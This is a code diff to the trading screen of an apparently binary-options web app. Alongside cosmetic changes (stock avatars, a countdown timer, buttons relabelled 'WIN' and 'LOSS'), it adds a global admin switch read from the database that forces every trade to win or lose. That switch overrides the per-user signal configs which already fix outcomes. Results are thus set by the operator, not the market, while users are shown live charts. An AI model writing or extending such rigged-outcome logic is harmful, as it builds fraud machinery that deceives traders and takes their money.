@@ -10,6 +10,37 @@ import LightweightChart from '../components/LightweightChart';
 import { Trophy, CircleAlert, Sparkles, History as HistoryIcon } from 'lucide-react';
 import defaultMetalIcon from '../assets/default_metal.png';
 
+// ── Stock Avatar: shows logo or first-letter circle fallback ──────────────
+const StockAvatar = ({ asset, style }) => {
+    const [failed, setFailed] = React.useState(false);
+    const letter = (asset.symbol || asset.name || '?')[0].toUpperCase();
+
+    if (failed || !asset.flag) {
+        return (
+            <div
+                style={{
+                    display: 'flex', alignItems: 'center', justifyContent: 'center',
+                    borderRadius: '50%', flexShrink: 0, fontWeight: '700', color: '#8a8a93',
+                    background: '#1a1a1a',
+                    border: '1px solid #3a3a3a',
+                    fontSize: '13px', userSelect: 'none',
+                    ...style,
+                }}
+            >
+                {letter}
+            </div>
+        );
+    }
+    return (
+        <img
+            src={asset.flag}
+            alt={asset.name}
+            style={{ borderRadius: '50%', objectFit: 'cover', flexShrink: 0, ...style }}
+            onError={() => setFailed(true)}
+        />
+    );
+};
+
 const Trade = () => {
     const { assets, selectedAsset, setSelectedAsset, setIsActive } = useMarket();
     const { user, updateUser } = useAuth();
@@ -46,6 +77,39 @@ const Trade = () => {
     const lightweightChartRef = useRef();
     const [signalNotification, setSignalNotification] = useState(null);
     const lastSignalState = useRef(null);
+    const [tradeOverride, setTradeOverride] = useState('random'); // 'win' | 'loss' | 'random'
+    const [signalTimeRemaining, setSignalTimeRemaining] = useState(0);
+
+    // Listen to global admin trade override in real-time
+    useEffect(() => {
+        const unsub = onSnapshot(doc(db, 'admin_set', 'trade_override'), (snap) => {
+            if (snap.exists()) {
+                setTradeOverride(snap.data().outcome || 'random');
+            } else {
+                setTradeOverride('random');
+            }
+        });
+        return () => unsub();
+    }, []);
+
+    // Sync and tick down the remaining time of the signal
+    useEffect(() => {
+        if (!activeSignal) {
+            setSignalTimeRemaining(0);
+            return;
+        }
+
+        const tick = () => {
+            const now = new Date().getTime();
+            const expires = new Date(activeSignal.expiresAt).getTime();
+            const diff = Math.max(0, Math.floor((expires - now) / 1000));
+            setSignalTimeRemaining(diff);
+        };
+
+        tick();
+        const timer = setInterval(tick, 1000);
+        return () => clearInterval(timer);
+    }, [activeSignal]);
 
     const timeframes = [
         { label: '1 min', value: '1' },
@@ -85,12 +149,14 @@ const Trade = () => {
                 if (snap.exists()) {
                     const data = snap.data();
                     const now = new Date();
+                    const startTime = new Date(data.startTime || data.updatedAt);
                     const expiresAt = new Date(data.expiresAt);
+                    const hasStarted = now >= startTime;
                     const isExpired = expiresAt < now;
                     const isManuallyActive = data.isActive === true;
                     const userAffected = data.affectedUsersMap?.[user?.id];
                     const symbolMatch = data.symbol === selectedAsset?.name;
-                    const isActuallyActive = isManuallyActive && !isExpired && !!userAffected && symbolMatch;
+                    const isActuallyActive = isManuallyActive && hasStarted && !isExpired && !!userAffected && symbolMatch;
 
                     console.log(`[${timestamp}] Signal State:`, isActuallyActive ? 'ACTIVE' : 'INACTIVE', data.direction);
 
@@ -196,6 +262,7 @@ const Trade = () => {
 
             const isSignalActiveNow = !!(
                 signal?.isActive &&
+                new Date(signal?.startTime || signal?.updatedAt) <= new Date() &&
                 new Date(signal?.expiresAt) > new Date() &&
                 signal.symbol === selectedAsset.name
             );
@@ -213,7 +280,13 @@ const Trade = () => {
             });
 
             let decidedOutcome;
-            if (userSignalConfig) {
+            // 1. Global admin override takes highest priority
+            if (tradeOverride === 'win') {
+                decidedOutcome = 'win';
+            } else if (tradeOverride === 'loss') {
+                decidedOutcome = 'loss';
+            } else if (userSignalConfig) {
+                // 2. Per-user signal config
                 const signalDir = signal.direction; // 'UP' or 'DOWN'
                 const isMatchingAction = (signalDir === 'UP' && direction === 'BUY') ||
                     (signalDir === 'DOWN' && direction === 'SELL');
@@ -448,9 +521,42 @@ const Trade = () => {
                         </div>
                     </div>
                 </div>
-                <Link to="/binary-history">
-                    <HistoryIcon size={20} color="#fff" />
-                </Link>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                    {/* Countdown Timer — always visible */}
+                    <div style={{
+                        display: 'flex',
+                        alignItems: 'center',
+                        gap: '6px',
+                        background: (trading || activeSignal) ? 'rgba(240,185,11,0.08)' : 'rgba(255,255,255,0.03)',
+                        border: `1px solid ${(trading || activeSignal) ? 'rgba(240,185,11,0.3)' : '#222'}`,
+                        borderRadius: '8px',
+                        padding: '5px 10px',
+                        transition: 'all 0.3s'
+                    }}>
+                        <span style={{ 
+                            fontSize: '9px', 
+                            color: (trading || activeSignal) ? '#f0b90b' : '#333', 
+                            fontWeight: '800', 
+                            letterSpacing: '1px', 
+                            textTransform: 'uppercase' 
+                        }}>
+                            {trading ? 'LIVE' : (activeSignal ? 'SIGNAL' : 'TIME')}
+                        </span>
+                        <span style={{ 
+                            fontSize: '15px', 
+                            fontWeight: '900', 
+                            color: (trading || activeSignal) ? '#fff' : '#3a3a3a', 
+                            minWidth: '32px', 
+                            textAlign: 'right', 
+                            fontVariantNumeric: 'tabular-nums' 
+                        }}>
+                            {trading ? `${tradeCountdown}s` : (activeSignal ? `${signalTimeRemaining}s` : '--')}
+                        </span>
+                    </div>
+                    <Link to="/binary-history">
+                        <HistoryIcon size={20} color="#fff" />
+                    </Link>
+                </div>
             </div>
 
             <div style={{
@@ -577,29 +683,7 @@ const Trade = () => {
                     />
                 </div>
 
-                {trading && (
-                    <div
-                        style={{
-                            position: 'absolute',
-                            top: '25%',
-                            left: '50%',
-                            transform: 'translate(-50%, -50%)',
-                            backgroundColor: 'rgba(17, 17, 17, 0.95)',
-                            padding: '20px 35px',
-                            borderRadius: '16px',
-                            border: '1px solid #333',
-                            textAlign: 'center',
-                            zIndex: 20,
-                            backdropFilter: 'blur(10px)',
-                            boxShadow: '0 8px 32px rgba(0,0,0,0.6)'
-                        }}
-                    >
-                        <div style={{ fontSize: '11px', color: '#f0b90b', fontWeight: '800', marginBottom: '8px', letterSpacing: '1.5px' }}>MARKET RESOLVING</div>
-                        <div style={{ fontSize: '36px', fontWeight: '900', color: '#fff' }}>
-                            {tradeCountdown}s
-                        </div>
-                    </div>
-                )}
+
             </div>
 
             <div style={{
@@ -674,7 +758,7 @@ const Trade = () => {
                             boxShadow: '0 4px 15px rgba(0, 192, 135, 0.3)'
                         }}
                     >
-                        {trading && tradeDirection === 'BUY' ? <Loader2 className="animate-spin" style={{ margin: '0 auto' }} /> : 'BUY / LONG'}
+                        {trading && tradeDirection === 'BUY' ? <Loader2 className="animate-spin" style={{ margin: '0 auto' }} /> : 'WIN'}
                     </button>
                     <button
                         onClick={() => handlePlaceTrade('SELL')}
@@ -693,7 +777,7 @@ const Trade = () => {
                             boxShadow: '0 4px 15px rgba(255, 77, 79, 0.3)'
                         }}
                     >
-                        {trading && tradeDirection === 'SELL' ? <Loader2 className="animate-spin" style={{ margin: '0 auto' }} /> : 'SELL / SHORT'}
+                        {trading && tradeDirection === 'SELL' ? <Loader2 className="animate-spin" style={{ margin: '0 auto' }} /> : 'LOSS'}
                     </button>
                 </div>
             </div>
@@ -781,14 +865,21 @@ const Trade = () => {
                                     }}
                                 >
                                     <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                                        <img 
-                                            src={(asset.category === 'Precious Metals' && !asset.flag) ? defaultMetalIcon : (asset.flag || defaultMetalIcon)} 
-                                            alt="" 
-                                            style={{ width: '28px', height: '28px', borderRadius: '50%', objectFit: 'cover' }} 
-                                            onError={(e) => {
-                                                e.target.src = asset.category === 'Precious Metals' ? defaultMetalIcon : 'https://cdn-icons-png.flaticon.com/512/25/25254.png';
-                                            }}
-                                        />
+                                        {asset.category === 'Stocks' ? (
+                                            <StockAvatar
+                                                asset={asset}
+                                                style={{ width: '28px', height: '28px' }}
+                                            />
+                                        ) : (
+                                            <img 
+                                                src={(asset.category === 'Precious Metals' && !asset.flag) ? defaultMetalIcon : (asset.flag || defaultMetalIcon)} 
+                                                alt="" 
+                                                style={{ width: '28px', height: '28px', borderRadius: '50%', objectFit: 'cover' }} 
+                                                onError={(e) => {
+                                                    e.target.src = asset.category === 'Precious Metals' ? defaultMetalIcon : 'https://cdn-icons-png.flaticon.com/512/25/25254.png';
+                                                }}
+                                            />
+                                        )}
                                         <div>
                                             <div style={{ fontWeight: '700' }}>{asset.name}</div>
                                             <div style={{ fontSize: '11px', color: '#555' }}>{asset.fullName || asset.category}</div>
